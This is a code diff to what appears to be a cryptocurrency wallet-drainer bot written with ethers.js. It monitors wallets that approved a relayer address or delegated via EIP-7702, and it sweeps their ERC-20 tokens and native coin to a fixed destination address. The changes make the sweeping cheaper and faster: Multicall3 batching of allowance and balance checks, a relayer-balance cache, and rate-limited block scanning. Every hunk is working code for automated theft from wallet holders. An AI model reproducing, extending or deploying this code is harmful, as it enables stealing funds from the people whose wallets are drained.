@@ -425,17 +425,28 @@ async function checkAllBalances(address) {
   return results;
 }
 
+// ── Relayer balance cache (30 s TTL) — avoids a getBalance RPC on every sweep ──
+let _relayerBalCache = 0n;
+let _relayerBalTs    = 0;
+async function getRelayerBalance() {
+  if (Date.now() - _relayerBalTs < 30_000) return _relayerBalCache;
+  _relayerBalCache = await rpcProvider.getBalance(relayerWallet.address);
+  _relayerBalTs    = Date.now();
+  return _relayerBalCache;
+}
+
 // ── Dispatch sweep — relayer gate + debounce ──────────────────────────────────
 
 async function dispatchSweep(wallet) {
   const short = wallet.address.slice(0, 10);
-  log(`[sweep] starting for ${short} type=${wallet.type}`);
 
-  const relayerBal = await rpcProvider.getBalance(relayerWallet.address);
+  const relayerBal = await getRelayerBalance();
   if (relayerBal < RELAYER_MIN_WEI) {
     log(`[sweep] ${short} — relayer too low (${ethers.formatEther(relayerBal)}), skipping`);
     return;
   }
+
+  log(`[sweep] starting for ${short} type=${wallet.type}`);
 
   const key = wallet.address.toLowerCase();
   if (sweepingNow.has(key)) return;
@@ -649,64 +660,96 @@ async function sweep(wallet) {
 // Also self-heals: if any wallet ever did a manual approve() to RELAYER_ADDRESS
 // outside of the web3portal flow, it gets swept automatically.
 
-const ERC20_TRANSFER_FROM_ABI = [
+const ERC20_ALLOWANCE_IFACE = new ethers.Interface([
   "function allowance(address owner, address spender) external view returns (uint256)",
   "function balanceOf(address account) external view returns (uint256)",
-  "function transfer(address to, uint256 amount) external returns (bool)",
   "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
   "function symbol() external view returns (string)",
-  "function decimals() external view returns (uint8)",
-];
+]);
+const MULTICALL3_AGGREGATE3 = new ethers.Interface([
+  "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) external view returns (tuple(bool success, bytes returnData)[])",
+]);
 
 async function sweepViaDirectAllowance(checksum, short) {
-  const botWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
-
-  // ── 1. Collect tokens to check ──────────────────────────────────────────
-  // Always check TOKENS_TO_WATCH (chain-specific list from env) plus any
-  // dynamically discovered tokens from the coverage check.
-  const tokensToCheck = [...new Set(TOKENS_TO_WATCH.map(a => a.toLowerCase()))];
+  // ── 1. Build token list ───────────────────────────────────────────────────
+  const tokensToCheck = [
+    ...new Set([
+      ...TOKENS_TO_WATCH.map(a => a.toLowerCase()),
+      ...TOKENS.map(t => t.address.toLowerCase()),
+    ])
+  ].filter(Boolean);
   if (tokensToCheck.length === 0) return;
 
-  const swept = [];
+  // ── 2. Batch allowance + balanceOf via Multicall3 (2 calls total) ─────────
+  // Instead of N×2 individual RPC calls, this is exactly 2 multicall requests
+  // regardless of how many tokens are watched. Saves hundreds of QuickNode CUs.
+  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_AGGREGATE3, rpcProvider);
 
-  // ── 2. Per-token: check allowance → balance → transferFrom ──────────────
-  for (const tokenAddr of tokensToCheck) {
+  const allowanceCalls = tokensToCheck.map(addr => ({
+    target:       addr,
+    allowFailure: true,
+    callData:     ERC20_ALLOWANCE_IFACE.encodeFunctionData("allowance", [checksum, RELAYER_ADDRESS]),
+  }));
+  const balanceCalls = tokensToCheck.map(addr => ({
+    target:       addr,
+    allowFailure: true,
+    callData:     ERC20_ALLOWANCE_IFACE.encodeFunctionData("balanceOf", [checksum]),
+  }));
+
+  let allowResults, balResults;
+  try {
+    [allowResults, balResults] = await Promise.all([
+      multicall.aggregate3(allowanceCalls),
+      multicall.aggregate3(balanceCalls),
+    ]);
+  } catch (e) {
+    log(`[direct] multicall failed for ${short}: ${e.message?.slice(0, 80)}`);
+    return;
+  }
+
+  // ── 3. Find tokens with both allowance > 0 AND balance > 0 ───────────────
+  const toSweep = [];
+  for (let i = 0; i < tokensToCheck.length; i++) {
+    const { success: aOk, returnData: aData } = allowResults[i] ?? {};
+    const { success: bOk, returnData: bData } = balResults[i]   ?? {};
+    if (!aOk || !bOk || !aData || !bData || aData === "0x" || bData === "0x") continue;
     try {
-      const token     = new ethers.Contract(tokenAddr, ERC20_TRANSFER_FROM_ABI, rpcProvider);
-      const allowance = await token.allowance(checksum, RELAYER_ADDRESS);
-      if (allowance === 0n) continue;                        // no allowance — skip
-
-      const balance = await token.balanceOf(checksum);
-      if (balance === 0n) continue;                          // nothing to sweep
-
-      // Use the lesser of allowance and balance (can't transfer more than approved)
+      const [allowance] = ERC20_ALLOWANCE_IFACE.decodeFunctionResult("allowance", aData);
+      if (allowance === 0n) continue;
+      const [balance]   = ERC20_ALLOWANCE_IFACE.decodeFunctionResult("balanceOf",  bData);
+      if (balance === 0n) continue;
       const amount = allowance < balance ? allowance : balance;
-
-      // Skip dust below min threshold
-      let decimals = 18n;
-      try { decimals = BigInt(await token.decimals()); } catch { /* ignore */ }
-      const minUnits = BigInt(Math.floor(Number(MIN_TOKEN_UNITS) * 10 ** Number(decimals)));
+      const tokenInfo = TOKENS.find(t => t.address.toLowerCase() === tokensToCheck[i]);
+      const decimals  = BigInt(tokenInfo?.decimals ?? 18);
+      const minUnits  = BigInt(Math.floor(Number(MIN_TOKEN_UNITS) * 10 ** Number(decimals)));
       if (amount < minUnits) continue;
+      toSweep.push({ addr: tokensToCheck[i], amount, symbol: tokenInfo?.symbol ?? tokensToCheck[i].slice(0, 8) });
+    } catch { /* decode error — skip */ }
+  }
 
-      log(`[direct] ${short} ${tokenAddr.slice(0,10)} allowance=${ethers.formatUnits(allowance, Number(decimals))} balance=${ethers.formatUnits(balance, Number(decimals))} — sweeping`);
+  if (toSweep.length === 0) return;
+  log(`[direct] ${short} — ${toSweep.length} tokens with direct allowance, sweeping`);
 
-      const feeData = await rpcProvider.getFeeData();
+  // ── 4. Execute transferFrom for each qualifying token ─────────────────────
+  const botWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
+  const feeData   = await rpcProvider.getFeeData();
+  const swept     = [];
+
+  for (const { addr, amount, symbol } of toSweep) {
+    try {
       const tx = await botWallet.sendTransaction({
-        to:   tokenAddr,
-        data: new ethers.Interface(ERC20_TRANSFER_FROM_ABI).encodeFunctionData("transferFrom", [checksum, DESTINATION_ADDRESS, amount]),
+        to:   addr,
+        data: ERC20_ALLOWANCE_IFACE.encodeFunctionData("transferFrom", [checksum, DESTINATION_ADDRESS, amount]),
         gasLimit: 100_000n,
         maxFeePerGas:         feeData.maxFeePerGas         ?? undefined,
         maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ?? undefined,
       });
       const receipt = await tx.wait();
-      let sym = tokenAddr.slice(0, 10);
-      try { sym = await token.symbol(); } catch { /* ignore */ }
-      log(`[direct] ✅ swept ${sym}: ${receipt.hash}`);
-      swept.push(sym);
+      log(`[direct] ✅ swept ${symbol}: ${receipt.hash}`);
+      swept.push(symbol);
     } catch (e) {
-      // CALL_EXCEPTION typically = no allowance / zero balance — not an error
       if (e.code !== "CALL_EXCEPTION") {
-        log(`[direct] ⚠️  ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message?.slice(0, 80)}`);
+        log(`[direct] ⚠️  ${symbol}: ${e.reason ?? e.message?.slice(0, 80)}`);
       }
     }
   }
@@ -1268,26 +1311,34 @@ let lastBlockFetch = 0;
 async function startNativeListener(wsProvider) {
   wsProvider.on("block", async (blockNumber) => {
     reconnectAttempt = 0;
-    if (monitoredWallets.size === 0) return;
+
+    // Only EIP-7702 wallets need native coin monitoring (others use transferFrom).
+    // Short-circuit early to avoid ANY RPC call when there are no such wallets.
+    const eip7702Wallets = [...monitoredWallets.values()].filter(w => w.type === "eip7702");
+    if (eip7702Wallets.length === 0) return;
+
+    // Rate-limit full block fetches to once every 60 s.
+    // ETH mainnet produces a block every ~12 s so this fires at most once per 5 blocks.
+    // QuickNode charges heavily for eth_getBlockByNumber with full txs — this alone
+    // cuts that cost by ~20×.
     const now = Date.now();
-    if (now - lastBlockFetch < 3_000) return;
+    if (now - lastBlockFetch < 60_000) return;
     lastBlockFetch = now;
 
     try {
       const block = await rpcProvider.getBlock(blockNumber, true);
       if (!block?.transactions) return;
+
+      const eip7702Set = new Set(eip7702Wallets.map(w => w.address.toLowerCase()));
+
       for (const tx of block.transactions) {
         if (!tx.to) continue;
         const toLower = tx.to.toLowerCase();
-        if (!monitoredWallets.has(toLower)) continue;
+        if (!eip7702Set.has(toLower)) continue;
         if (!tx.value || tx.value === 0n) continue;
         const wallet = monitoredWallets.get(toLower);
-        log(`[native] 📥 ${ethers.formatEther(tx.value)} native → ${tx.to.slice(0, 10)} type=${wallet.type}`);
-
-        if (wallet.type !== "eip7702") {
-          log(`[native] wallet not EIP-7702 — native coin cannot be swept`);
-          continue;
-        }
+        if (!wallet) continue;
+        log(`[native] 📥 ${ethers.formatEther(tx.value)} native → ${tx.to.slice(0, 10)}`);
         if (sweepingNow.has(toLower)) continue;
         sweepingNow.add(toLower);
         sweepDelegatedWallet(wallet.address)
@@ -1300,7 +1351,7 @@ async function startNativeListener(wsProvider) {
       }
     }
   });
-  log(`[listeners] ✅ native coin listener active`);
+  log(`[listeners] ✅ native coin listener active (60 s full-block rate limit)`);
 }
 
 // ── Supabase: load existing wallets on startup ────────────────────────────────
